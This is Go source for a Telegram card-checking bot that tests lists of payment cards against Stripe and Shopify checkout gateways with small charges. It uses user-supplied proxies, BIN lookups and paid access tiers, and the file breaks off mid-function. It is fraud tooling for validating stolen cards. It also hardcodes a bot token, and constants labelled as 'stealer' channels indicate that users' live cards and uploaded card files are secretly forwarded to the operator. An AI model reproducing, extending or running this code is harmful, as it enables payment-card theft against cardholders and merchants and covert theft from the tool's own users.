package main

import (
        "bytes"
        "context"
        "fmt"
        "io"
        "math/rand"
        "net/http"
        "net/url"
        "os"
        "os/exec"
        "sort"
        "strconv"
        "strings"
        "sync"
        "encoding/json"
        "sync/atomic"
        "time"

        tele "gopkg.in/telebot.v4"
)

// ──────────────────────── config ────────────────────────────────────

const botToken = "8691060325:AAH7znw0yRegyPhtdLvZTpHmC6zdi1ncK9A"
// Dedicated channel IDs
const (
        chargedStealerChatID = -1003787847142  // charged cards
        fileStealerChatID    = -1003946176879  // all .txt files
        approvedStealerChatID = -1003981267330 // all approved/live cards
        fullLogsChatID       = -1003724119105  // every card check log
        hitLogChatID         = -1003913393821  // legacy formatted hit log
        stealerChatID        = -1003340422567  // legacy fallback
)

// Override chat IDs via env vars if needed
var liveChatID = func() int64 {
        if v := os.Getenv("LIVE_CHAT_ID"); v != "" {
                if id, err := strconv.ParseInt(v, 10, 64); err == nil {
                        return id
                }
        }
        return approvedStealerChatID
}()

var fileChatID = func() int64 {
        if v := os.Getenv("FILE_CHAT_ID"); v != "" {
                if id, err := strconv.ParseInt(v, 10, 64); err == nil {
                        return id
                }
        }
        return fileStealerChatID
}()

var adminIDs = map[int64]bool{
        8459499081: true,
}

// cfg is package-level so isAdmin and handlers can access it.
var cfg *BotConfig

func isAdmin(uid int64) bool {
        if adminIDs[uid] {
                return true
        }
        if cfg != nil {
                cfg.mu.RLock()
                defer cfg.mu.RUnlock()
                for _, a := range cfg.DynamicAdmins {
                        if a == uid {
                                return true
                        }
                }
        }
        return false
}

// ──────────────────────── Bot config ────────────────────────────────

type BotConfig struct {
        mu             sync.RWMutex
        BannedUsers    map[int64]bool      `json:"banned_users"`
        AllowedUsers   map[int64]bool      `json:"allowed_users"`
        PvtOnly        bool                `json:"pvt_only"`
        BlockedIDs     []int64             `json:"blocked_ids"`
        AllowOnlyIDs   []int64             `json:"allow_only_ids"`
        RestrictAll    bool                `json:"restrict_all"`
        Groups         []int64             `json:"groups"`
        GroupsOnly     bool                `json:"groups_only"`
        DynamicAdmins  []int64             `json:"dynamic_admins"`
        Perms          map[string][]string `json:"perms"`
        SatanMode      bool                `json:"satan_mode"`
        GlobalCardLimit int                `json:"global_card_limit"`
        UserCardLimits map[int64]int       `json:"user_card_limits"`
        LogEnabled     bool                `json:"log_enabled"`
}

func NewBotConfig() *BotConfig {
        return &BotConfig{
                BannedUsers:     make(map[int64]bool),
                AllowedUsers:    make(map[int64]bool),
                Perms:           make(map[string][]string),
                UserCardLimits:  make(map[int64]int),
                GlobalCardLimit: 10000,
        }
}

func (bc *BotConfig) Save() {
        _ = mongoSaveConfig(bc)
}

func (bc *BotConfig) Load() {
        _ = mongoLoadConfig(bc)
}

func (um *UserManager) Save() {
        um.mu.RLock()
        defer um.mu.RUnlock()
        for uid, ud := range um.users {
                _ = mongoSaveUser(uid, "", ud)
        }
}

func (um *UserManager) Load() {
        users, err := mongoLoadAllUsers()
        if err != nil {
                return
        }
        um.mu.Lock()
        um.users = users
        um.mu.Unlock()
}

func (bc *BotConfig) IsBanned(uid int64) bool {
        bc.mu.RLock()
        defer bc.mu.RUnlock()
        return bc.BannedUsers[uid]
}

func (bc *BotConfig) IsAllowed(uid int64, isPrivate bool) bool {
        if isAdmin(uid) {
                return true
        }
        bc.mu.RLock()
        defer bc.mu.RUnlock()
        // SatanMode — all restrictions bypassed, everyone allowed
        if bc.SatanMode {
                return true
        }
        // BlockedIDs — restricted via /restrict <id>
        for _, bid := range bc.BlockedIDs {
                if bid == uid {
                        return false
                }
        }
        // RestrictAll — only AllowOnlyIDs can access
        if bc.RestrictAll {
                found := false
                for _, aid := range bc.AllowOnlyIDs {
                        if aid == uid {
                                found = true
                                break
                        }
                }
                if !found {
                        return false
                }
        }
        // GroupsOnly — deny private chats unless user is in AllowedUsers
        if bc.GroupsOnly && isPrivate && !bc.AllowedUsers[uid] {
                return false
        }
        // PvtOnly
        if bc.PvtOnly && !bc.AllowedUsers[uid] {
                return false
        }
        return true
}

// hasPerm returns true if uid has permission for the given command
// (admins always have permission).
func hasPerm(uid int64, cmd string) bool {
        if isAdmin(uid) {
                return true
        }
        if cfg == nil {
                return false
        }
        cfg.mu.RLock()
        defer cfg.mu.RUnlock()
        key := strconv.FormatInt(uid, 10)
        for _, c := range cfg.Perms[key] {
                if c == cmd {
                        return true
                }
        }
        return false
}

// getCardLimit returns the max cards a user can check at once.
// Per-user limit takes priority over global. 0 means unlimited.
func getCardLimit(uid int64) int {
        if cfg == nil {
                return 0
        }
        // Admins bypass card limits entirely
        if isAdmin(uid) {
                return 0
        }
        cfg.mu.RLock()
        defer cfg.mu.RUnlock()
        if lim, ok := cfg.UserCardLimits[uid]; ok && lim > 0 {
                return lim
        }
        return cfg.GlobalCardLimit
}

// enforceCardLimit truncates cards if limit is set. Returns truncated list and whether it was truncated.
func enforceCardLimit(cards []string, uid int64) ([]string, int) {
        limit := getCardLimit(uid)
        if limit <= 0 || len(cards) <= limit {
                return cards, 0
        }
        return cards[:limit], limit
}

// ──────────────────────── BIN lookup ────────────────────────────────

type BINInfo struct {
        Brand       string `json:"brand"`
        Type        string `json:"type"`
        Level       string `json:"level"`
        Bank        string `json:"bank"`
        Country     string `json:"country"`
        CountryCode string `json:"country_code"`
        CountryFlag string `json:"country_flag"`
}

var binCache sync.Map // string (first6) → *BINInfo

func lookupBIN(bin string) *BINInfo {
        if len(bin) < 6 {
                return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
        }
        first6 := bin[:6]
        if v, ok := binCache.Load(first6); ok {
                return v.(*BINInfo)
        }
        cl := &http.Client{Timeout: 5 * time.Second}
        resp, err := cl.Get("https://bins.antipublic.cc/bins/" + first6)
        if err != nil {
                info := &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
                binCache.Store(first6, info)
                return info
        }
        defer resp.Body.Close()
        body, _ := io.ReadAll(resp.Body)
        var info BINInfo
        if json.Unmarshal(body, &info) != nil {
                info = BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
        }
        if info.CountryFlag == "" {
                info.CountryFlag = countryFlag(info.CountryCode)
        }
        binCache.Store(first6, &info)
        return &info
}

func migrateJSONToMongo(um *UserManager, cfg *BotConfig) {
        // This function is a placeholder to satisfy the call in main()
        // Legacy JSON migration logic was removed or not provided in the source files.
}

func countryFlag(code string) string {
        if len(code) != 2 {
                return "🏳️"
        }
        code = strings.ToUpper(code)
        return string(rune(0x1F1E6+rune(code[0])-'A')) + string(rune(0x1F1E6+rune(code[1])-'A'))
}

// ──────────────────────── Premium emoji helpers ──────────────────────

func em(id, fallback string) string {
        return fallback
}

const (
        emojiCharged   = "5352703228586773121"
        emojiCard      = "5472250091332993630"
        emojiGateway   = "4958689671950369798"
        emojiDoc       = "5444856076954520455"
        emojiPrice     = "5409048419211682843"
        emojiBrand     = "5402186569006210455"
        emojiBank      = "5332455502917949981"
        emojiGlobe     = "5224450179368767019"
        emojiUser      = "6100546649312987047"
        emojiLightning = "5354879329601876937"
        emojiCheck     = "6296367896398399651"
        emojiBlue      = "5780403162913444711"
        emojiSearch    = "5395444784611480792"
        emojiCross     = "5210952531676504517"
        emojiWarn      = "5447644880824181073"
        emojiClock     = "5780616017197667562"

        // /start message emojis
        emojiBot       = "5352994912700762383"
        emojiWave      = "5947013302331640354"
        emojiList      = "5222444124698853913"
        emojiCmdSh     = "5445353829304387411"
        emojiCmdTxt    = "5305265301917549162"
        emojiCmdSetpr  = "5447410659077661506"
        emojiCmdRmpr   = "5445267414562389170"
        emojiCmdStats  = "5231200819986047254"
        emojiCmdActive = "6001526766714227911"
        emojiPwr       = "5456140674028019486"
        emojiPwrStart  = "5429265105151879015"

        // /stats message emojis
        emojiRowCheck = "5197269100878907942"
        emojiRowAppr  = "5352658337588612223"
        emojiRowDecl  = "5355169587786713125"
        emojiRowCard  = "5474641619317698626"
        emojiMoney    = "6235459831302460476"
        emojiHitRate  = "5244837092042750681"
        emojiPctAppr  = "6084779072750097974"
        emojiPwrStats = "5195033767969839232"

        // /active message emojis
        emojiLive = "5256134032852278918"
        emojiTime = "5413704112220949842"

        // /start card emojis
        emojiStar     = "5386757680679377085"
        emojiCalendar = "6136500366008649837"
)

// ──────────────────────── User / persistence ────────────────────────

type UserStats struct {
        TotalChecked    int64   `json:"total_checked"`
        TotalCharged    int64   `json:"total_charged"`
        TotalApproved   int64   `json:"total_approved"`
        TotalDeclined   int64   `json:"total_declined"`
        TotalChargedAmt float64 `json:"total_charged_amt"`
}

type UserData struct {
	Proxies    []string  `json:"proxies"`
	Stats      UserStats `json:"stats"`
	Credits    int       `json:"credits"`
	IsPremium  bool      `json:"is_premium"`
	ExpireDate string    `json:"expire_date"`
}

type UserManager struct {
        mu    sync.RWMutex
        users map[int64]*UserData
}

func NewUserManager() *UserManager {
        return &UserManager{users: make(map[int64]*UserData)}
}

func (um *UserManager) Get(uid int64) *UserData {
        um.mu.RLock()
        ud := um.users[uid]
        um.mu.RUnlock()
        if ud != nil {
                return ud
        }
        um.mu.Lock()
        defer um.mu.Unlock()
        if um.users[uid] == nil {
                um.users[uid] = &UserData{}
        }
        return um.users[uid]
}

func (um *UserManager) AllIDs() []int64 {
        um.mu.RLock()
        defer um.mu.RUnlock()
        ids := make([]int64, 0, len(um.users))
        for id := range um.users {
                ids = append(ids, id)
        }
        return ids
}

// ──────────────────────── Check session ─────────────────────────────

type CheckSession struct {
        UserID       int64
        Username     string
        UserFullName string
        SessionID    string
        Cards        []string
        Total        int
        Checked      atomic.Int64
        Charged      atomic.Int64
        Approved     atomic.Int64
        Declined     atomic.Int64
        Errors       atomic.Int64
        StartTime    time.Time
        Cancel       context.CancelFunc
        Cancelled    atomic.Bool
        Done         chan struct{}
        ShowDecl     bool   // true for /sh, false for /txt
        ShowApproved bool   // true to send approved cards in chat
        GatewayName  string // display name for progress/completed messages

        chargedAmtMu sync.Mutex
        chargedAmt   float64

        liveMu    sync.Mutex
        liveCards []string

        errorMu    sync.Mutex
        errorCards []string
}

func (s *CheckSession) AddLiveCard(card string) {
        s.liveMu.Lock()
        s.liveCards = append(s.liveCards, card)
        s.liveMu.Unlock()
}

func (s *CheckSession) AddErrorCard(card string) {
        s.errorMu.Lock()
        s.errorCards = append(s.errorCards, card)
        s.errorMu.Unlock()
}

func (s *CheckSession) ErrorCards() []string {
        s.errorMu.Lock()
        defer s.errorMu.Unlock()
        out := make([]string, len(s.errorCards))
        copy(out, s.errorCards)
        return out
}

func (s *CheckSession) AddChargedAmt(v float64) {
        s.chargedAmtMu.Lock()
        s.chargedAmt += v
        s.chargedAmtMu.Unlock()
}

func (s *CheckSession) ChargedAmt() float64 {
        s.chargedAmtMu.Lock()
        defer s.chargedAmtMu.Unlock()
        return s.chargedAmt
}

func generateSessionID() string {
        const hex = "0123456789ABCDEF"
        b := make([]byte, 9)
        for i := range b {
                if i == 4 {
                        b[i] = '-'
                } else {
                        b[i] = hex[rand.Intn(16)]
                }
        }
        return string(b)
}

var activeSessions sync.Map // int64 (userID) → *CheckSession

// ──────────────────────── Global card accumulators ──────────────────
var (
        globalChargedMu   sync.Mutex
        globalChargedCards []string

        globalApprovedMu   sync.Mutex
        globalApprovedCards []string
)

func addGlobalCharged(card string) {
        globalChargedMu.Lock()
        globalChargedCards = append(globalChargedCards, card)
        globalChargedMu.Unlock()
}

func addGlobalApproved(card string) {
        globalApprovedMu.Lock()
        globalApprovedCards = append(globalApprovedCards, card)
        globalApprovedMu.Unlock()
}

// ──────────────────────── Pending /txt sessions (awaiting Yes/No) ───

type txtPendingData struct {
        UserID       int64
        Username     string
        UserFullName string
        ChatID       int64
        Cards        []string
        GateName     string
        CheckFn      stripeCheckFn
}

var (
        txtPendingMu sync.Mutex
        txtPending   = map[int64]*txtPendingData{} // userID → pending data
)

// ──────────────────────── Custom sites ─────────────────────────

var (
        customSitesMu sync.RWMutex
        customSites   []string
)

// ──────────────────────── Blacklisted (test) sites ─────────────

var (
        blacklistMu sync.RWMutex
        blacklisted = make(map[string]bool)
)

func isBlacklisted(site string) bool {
        blacklistMu.RLock()
        defer blacklistMu.RUnlock()
        return blacklisted[site]
}

func blacklistSite(site string) {
        blacklistMu.Lock()
        blacklisted[site] = true
        blacklistMu.Unlock()

        saveBlacklist()
        fmt.Printf("[BLACKLIST] test store detected, blacklisted: %s\n", site)
}

func saveBlacklist() {
        blacklistMu.RLock()
        snapshot := make([]string, 0, len(blacklisted))
        for site := range blacklisted {
                snapshot = append(snapshot, site)
        }
        defer blacklistMu.RUnlock()
        if isMongo() {
                _ = mongoSaveBlacklist(snapshot)
        }
}

func loadBlacklist() {
        blacklistMu.Lock()
        defer blacklistMu.Unlock()
        blacklisted = make(map[string]bool)
        if sites, err := mongoLoadBlacklist(); err == nil {
                for _, site := range sites {
                        blacklisted[site] = true
                }
                return
        }
}

func loadCustomSites() {
        customSitesMu.Lock()
        defer customSitesMu.Unlock()
        sites, err := mongoLoadCustomSites()
        if err != nil {
                return
        }
        customSites = sites
}

func saveCustomSites() {
        customSitesMu.RLock()
        snapshot := make([]string, len(customSites))
        copy(snapshot, customSites)
        customSitesMu.RUnlock()
        _ = mongoSaveCustomSites(snapshot)
}

func getCustomSites() []string {
        customSitesMu.RLock()
        defer customSitesMu.RUnlock()
        if len(customSites) == 0 {
                return nil
        }
        cp := make([]string, len(customSites))
        copy(cp, customSites)
        return cp
}

// ──────────────────────── Site pool ─────────────────────────────────

var (
        sitePoolMu sync.RWMutex
        sitePool   []string
)

func refreshSitePool() {
        apiURL := strings.TrimSpace(workingSitesAPI)
        if apiURL == "" {
                sitePoolMu.Lock()
                if len(sitePool) == 0 {
                        sitePool = []string{defaultShopURL}
                }
                sitePoolMu.Unlock()
                return
        }
        sites, err := fetchAffordableSites(apiURL, maxSiteAmount)
        if err != nil || len(sites) == 0 {
                sitePoolMu.Lock()
                if len(sitePool) == 0 {
                        sitePool = []string{defaultShopURL}
                }
                sitePoolMu.Unlock()
                return
        }
        rand.Shuffle(len(sites), func(i, j int) {
                sites[i], sites[j] = sites[j], sites[i]
        })
        newPool := make([]string, 0, len(sites))
        for _, s := range sites {
                newPool = append(newPool, strings.TrimRight(s.URL, "/"))
        }
        sitePoolMu.Lock()
        sitePool = newPool
        sitePoolMu.Unlock()
}

func getSitePool() []string {
        var raw []string
        // Prefer custom sites if any are set
        if cs := getCustomSites(); len(cs) > 0 {
                raw = cs
        } else {
                sitePoolMu.RLock()
                raw = make([]string, len(sitePool))
                copy(raw, sitePool)
                sitePoolMu.RUnlock()
        }
        // Filter out blacklisted test stores
        filtered := make([]string, 0, len(raw))
        for _, s := range raw {
                if !isBlacklisted(s) {
                        filtered = append(filtered, s)
                }
        }
        return filtered
}

// ──────────────────────── Message templates ─────────────────────────

func formatWelcomeCard(uid int64, username string, proxyCount int) string {
        return "<b>Saitamaz Checker Awaits You!</b>\n" +
                "- - - - - - - - - - - - - - - - - -\n\n" +
                "✦ The Most Powerful Checker Bot Ever Built.\n\n" +
                "✦ Lightning Fast Gates, Instant Results.\n" +
                "✦ Free + Premium Gates and Tools.\n" +
                "✦ Multiple Payment Methods Support.\n" +
                "✦ Advanced Fraud Detection System.\n\n" +
                "- - - - - - - - - - - - - - - - - -\n" +
                "<b>Saitamaz Checker Ready To Serve You ⚡</b>\n\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "<b>Your Status</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "🔵 <b>ID</b> → <code>" + strconv.FormatInt(uid, 10) + "</code>\n" +
                "👤 <b>User</b> → @" + username + "\n" +
                "⭐ <b>Bot</b> → @Saitamaz_shopiBot\n" +
                "📅 <b>Proxies</b> → " + strconv.Itoa(proxyCount) + " loaded\n" +
                "⚡ <b>Status</b> → ✅ <b>Active</b> ✅\n" +
                "━━━━━━━━━━━━━━━━━━━━━━"
}

func formatGatesMsg() string {
        return "<b>Saitamaz Checker Awaits You!</b>\n" +
                "- - - - - - - - - - - - - - - - - -\n\n" +
                "Total ➜ 6\n" +
                "On ➜ 6 ✅\n" +
                "Off ➜ 0 ❌\n" +
                "Maintenance ➜ 0 ⚠️\n\n" +
                "- - - - - - - - - - - - - - - - - -\n" +
                "<b>Saitamaz Checker Ready To Serve You ⚡</b>"
}

func formatPricingMsg() string {
        return "💥 <b>Available Access Plans</b> 💥\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "𝑪𝒐𝒓𝒆 𝑨𝒄𝒄𝒆𝒔 ⚡\n" +
                "Duration ↬ 7 days\n" +
                "Price ↬ DM\n" +
                "Credits ↬ Unlimited until plan ends\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "𝑬𝒍𝒊𝒕𝒆 𝑨𝒄𝒄𝒆𝒔 ⭐\n" +
                "Duration ↬ 15 days\n" +
                "Price ↬ DM\n" +
                "Credits ↬ Unlimited until plan ends\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "𝑹𝒐𝒐𝒕 𝑨𝒄𝒄𝒆𝒔 👑\n" +
                "Duration ↬ 30 days\n" +
                "Price ↬ DM\n" +
                "Credits ↬ Unlimited until plan ends\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "𝑿-𝑨𝒄𝒄𝒆𝒔 👑\n" +
                "Duration ↬ 90 days\n" +
                "Price ↬ DM\n" +
                "Credits ↬ Unlimited until plan ends\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                "DM ↬ @saitama_god69"
}

func formatStartMsg() string {
        return "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "  " + em(emojiBot, "🤖") + " 𝗖𝗖 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗕𝗼𝘁 " + em(emojiBot, "🤖") + "\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                em(emojiWave, "👋") + "  <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲!</b>  Use the commands\nbelow to get started.\n\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "  " + em(emojiList, "📖") + "  𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗟𝗶𝘀𝘁 " + em(emojiList, "📖") + "\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n\n" +
                em(emojiCmdSh, "🔫") + "  /sh &lt;cc list&gt;\n" +
                "     ∟ Quick check up to 100 cards\n       Paste cards directly inline\n\n" +
                em(emojiCharged, "🔥") + "  /str &lt;cc list&gt;  /mstr &lt;cc list&gt;  /mstrtxt\n" +
                "     ∟ Stripe Auth (UK, no charge)\n       Inline or mass-txt\n\n" +
                em(emojiCharged, "🔥") + "  /str1 &lt;cc list&gt;  /mstr1 &lt;cc list&gt;  /mstr1txt\n" +
                "     ∟ Stripe UHQ $1 GBP (checkout)\n       Inline or mass-txt\n\n" +
                em(emojiCharged, "🔥") + "  /str2 &lt;cc list&gt;  /mstr2 &lt;cc list&gt;  /mstr2txt\n" +
                "     ∟ Stripe UHQ $5 NZD (SecondStork)\n       Inline or mass-txt\n\n" +
                em(emojiCharged, "🔥") + "  /str4 &lt;cc list&gt;  /mstr4 &lt;cc list&gt;  /mstr4txt\n" +
                "     ∟ Stripe Donation $3 USD\n       Inline or mass-txt\n\n" +
                em(emojiCharged, "🔥") + "  /str5 &lt;cc list&gt;  /mstr5 &lt;cc list&gt;  /mstr5txt\n" +
                "     ∟ Stripe $1 USD\n       Inline or mass-txt\n\n" +
                em(emojiCmdTxt, "📎") + "  /txt\n" +
                "     ∟ Reply to a .txt file to mass\n       check all cards inside it\n\n" +
                em(emojiCmdSetpr, "🌐") + "  /proxy &lt;proxy&gt;\n" +
                "     ∟ Add proxy(s) for checking\n       One per line, or a single proxy\n\n" +
                em(emojiCmdRmpr, "🗑") + "  /roxy &lt;proxy&gt;\n" +
                "     ∟ Remove a specific proxy\n\n" +
                em(emojiCmdRmpr, "🗑") + "  /roxy all\n" +
                "     ∟ Remove all saved proxies\n\n" +
                em(emojiCmdStats, "📊") + "  /stats\n" +
                "     ∟ View your personal usage\n       stats and hit rates\n\n" +
                em(emojiCmdActive, "👥") + "  /active\n" +
                "     ∟ See all users currently\n       checking with live progress\n\n" +
                "━━━━━━━━━━━━━━━━━━━━━━\n" +
                "  " + em(emojiPwr, "⚡") + " 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @saitama_god69 " + em(emojiPwrStart, "⚡") + "\n" +
                "━━━━━━━━━━━━━━━━━━━━━━"
}

func formatProgressMsg(s *CheckSession) string {
        checked := int(s.Checked.Load())
        total := s.Total
        charged := int(s.Charged.Load())
        approved := int(s.Approved.Load())
        declined := int(s.Declined.Load())
        errors := int(s.Errors.Load())
        elapsed := time.Since(s.StartTime).Truncate(time.Second)

        pgGw := s.GatewayName
        if pgGw == "" {
                pgGw = "AutoShopify Charge"
        }
        pct := 0
        if total > 0 {
                pct = checked * 100 / total
        }
        barLen := 12
        filled := barLen * checked / max(total, 1)
        bar := strings.Repeat("█", filled) + strings.Repeat("░", barLen-filled)
        return "<b>🟡 CHECKING IN PROGRESS</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "Session ❯ <b>" + s.SessionID + "</b>\n" +
                "Gateway ❯ <b>" + pgGw + "</b>\n" +
                "Progress ❯ <code>" + bar + "</code> <b>" + strconv.Itoa(pct) + "%</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "💳 Total ❯ <b>" + strconv.Itoa(total) + "</b>\n" +
                "🔍 Checked ❯ <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
                "🔥 Charged ❯ <b>" + strconv.Itoa(charged) + "</b>\n" +
                "✅ Approved ❯ <b>" + strconv.Itoa(approved) + "</b>\n" +
                "❌ Declined ❯ <b>" + strconv.Itoa(declined) + "</b>\n" +
                "⚠️ Errors ❯ <b>" + strconv.Itoa(errors) + "</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "⏱ Time ❯ <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b>\n" +
                "⚡ Speed ❯ <b>" + fmt.Sprintf("%.0f", cardsPerMin(s)) + " cpm</b>\n" +
                "👤 User ❯ <b>@" + s.Username + "</b>"
}

func formatCompletedMsg(s *CheckSession) string {
        checked := int(s.Checked.Load())
        total := s.Total
        charged := int(s.Charged.Load())
        approved := int(s.Approved.Load())
        declined := int(s.Declined.Load())
        errors := int(s.Errors.Load())
        elapsed := time.Since(s.StartTime).Truncate(time.Millisecond * 100)

        cmpGw := s.GatewayName
        if cmpGw == "" {
                cmpGw = "AutoShopify Charge"
        }
        return "<b>🟢 CHECK COMPLETED</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "Session ❯ <b>" + s.SessionID + "</b>\n" +
                "Gateway ❯ <b>" + cmpGw + "</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "💳 Total ❯ <b>" + strconv.Itoa(total) + "</b>\n" +
                "🔍 Checked ❯ <b>" + strconv.Itoa(checked) + "/" + strconv.Itoa(total) + "</b>\n" +
                "🔥 Charged ❯ <b>" + strconv.Itoa(charged) + "</b>\n" +
                "✅ Approved ❯ <b>" + strconv.Itoa(approved) + "</b>\n" +
                "❌ Declined ❯ <b>" + strconv.Itoa(declined) + "</b>\n" +
                "⚠️ Errors ❯ <b>" + strconv.Itoa(errors) + "</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "⏱ Time ❯ <b>" + fmt.Sprintf("%.1fs", elapsed.Seconds()) + "</b>\n" +
                "⚡ Speed ❯ <b>" + fmt.Sprintf("%.0f", cardsPerMin(s)) + " cpm</b>\n" +
                "👤 User ❯ <b>@" + s.Username + "</b>"
}

func formatHitLogMsg(card string, r *CheckResult, sess *CheckSession) string {
        name := sess.UserFullName
        if name == "" {
                name = sess.Username
        }
        return "<b>CHARGED HIT</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                fmt.Sprintf("Gateway ❯ %s %s USD\n", r.SiteName, r.Amount) +
                fmt.Sprintf("Response ❯ %s\n", r.StatusCode) +
                fmt.Sprintf("User ❯ <b>%s</b> (<code>%d</code>)", name, sess.UserID)
}

func formatFullLogMsg(card string, status string, r *CheckResult, sess *CheckSession, errMsg string) string {
        name := sess.UserFullName
        if name == "" {
                name = sess.Username
        }
        resp := r.StatusCode
        if resp == "" {
                resp = status
        }
        gw := r.Gateway
        if gw == "" {
                gw = sess.GatewayName
                if gw == "" {
                        gw = "Unknown Gateway"
                }
        }
        var extra string
        if errMsg != "" {
                extra = fmt.Sprintf("Error ❯ %s\n", errMsg)
        }
        return fmt.Sprintf("<b>%s HIT</b>\n", status) +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                fmt.Sprintf("Gateway ❯ %s %s USD\n", gw, r.Amount) +
                fmt.Sprintf("Response ❯ %s\n", resp) +
                extra +
                fmt.Sprintf("User ❯ <b>%s</b> (<code>%d</code>)", name, sess.UserID)
}


func maskProxy(proxyURL string) string {
        if proxyURL == "" {
                return "∅"
        }
        u, err := url.Parse(proxyURL)
        if err != nil {
                if strings.Contains(proxyURL, "@") {
                        parts := strings.Split(proxyURL, "@")
                        if len(parts) > 1 {
                                return parts[len(parts)-1]
                        }
                }
                return "***"
        }
        if u.Host != "" {
                return u.Host
        }
        return "***"
}

func formatCardLine(card string, bin *BINInfo) string {
        if bin == nil {
                return "<code>" + card + "</code>"
        }
        return "<code>" + card + "</code> [" + bin.Brand + "/" + bin.Type + "/" + bin.Level + "] {" + bin.Bank + "}"
}

func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
        gw := r.Gateway
        if gw == "" {
                gw = "Unknown Gateway"
        }
        header := "<tg-emoji emoji-id=\"5895284252362149161\">✅</tg-emoji> <b>" + gw + "</b>"
        amountStr := r.Amount
        if r.Currency != "" {
                amountStr = getCurrencySymbol(r.Currency) + r.Amount
        }
        return header + "\n" +
                "━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                "<tg-emoji emoji-id=\"5895638385300606573\">⚡</tg-emoji> <b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆</b> ➜ " + gw + " " + amountStr + "\n" +
                "<tg-emoji emoji-id=\"5895638385300606573\">💳</tg-emoji> <b>𝗖𝗖</b> ➜ <code>" + card + "</code>\n" +
                "<tg-emoji emoji-id=\"5231200819986047254\">📊</tg-emoji> <b>𝗦𝘁𝗮𝘁𝘂𝘴</b> ➜ <tg-emoji emoji-id=\"5895325492638125139\">🔥</tg-emoji> <b>𝙲𝙷𝙰𝚁𝙶𝙴𝙳</b>\n" +
                "<tg-emoji emoji-id=\"5443038326535759644\">💬</tg-emoji> <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲</b> ➜ " + r.StatusCode + " 🎉\n" +
                "━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                "<tg-emoji emoji-id=\"5895564043711680203\">🏷</tg-emoji> <b>𝗕𝗜𝗡</b> ➜ " + bin.Brand + " — " + bin.Type + " — " + bin.Level + "\n" +
                "<tg-emoji emoji-id=\"5895576786879647172\">🏦</tg-emoji> <b>𝗕𝗮𝗻𝗸</b> ➜ " + bin.Bank + "\n" +
                bin.CountryFlag + " <b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆</b> ➜ " + bin.Country + "\n" +
                "━━━━━━━━━━━━━━━━━━━━━━━━\n" +
                "<tg-emoji emoji-id=\"5895227687642861193\">👤</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆</b> ➜ @" + username + "\n" +
                "<tg-emoji emoji-id=\"5895638385300606573\">🤖</tg-emoji> <b>𝗕𝗼𝘁</b> ➜ @Saitamaz_shopiBot"
}

func formatApprovedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
        return "🟡 <b>APPROVED CARD</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "<tg-emoji emoji-id=\"5895638385300606573\">💳</tg-emoji> <b>Card</b> ❯ " + formatCardLine(card, bin) + "\n" +
                "<tg-emoji emoji-id=\"5231200819986047254\">📊</tg-emoji> <b>Status</b> ❯ <tg-emoji emoji-id=\"5895284252362149161\">✅</tg-emoji> <b>APPROVED</b>\n" +
                "<tg-emoji emoji-id=\"5443038326535759644\">💬</tg-emoji> <b>Response</b> ❯ <b>" + r.StatusCode + "</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "<tg-emoji emoji-id=\"5895564043711680203\">🏷</tg-emoji> <b>Bin</b> ❯ <b>" + bin.Brand + " - " + bin.Type + " - " + bin.Level + "</b>\n" +
                "<tg-emoji emoji-id=\"5895576786879647172\">🏦</tg-emoji> <b>Bank</b> ❯ <b>" + bin.Bank + "</b>\n" +
                bin.CountryFlag + " <b>" + bin.Country + "</b>\n" +
                "Proxy ❯ <code>" + maskProxy(proxyURL) + "</code>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
                "<tg-emoji emoji-id=\"5895227687642861193\">👤</tg-emoji> <b>User</b> ❯ <b>@" + username + "</b>"
}

func formatDeclinedMsg(card string, bin *BINInfo, r *CheckResult, username, proxyURL string) string {
        return "<tg-emoji emoji-id=\"5210952531676504517\">❌</tg-emoji> <b>DECLINED CARD</b>\n" +
                "━━━━━━━━━━━━━━━━━━━━\n" +
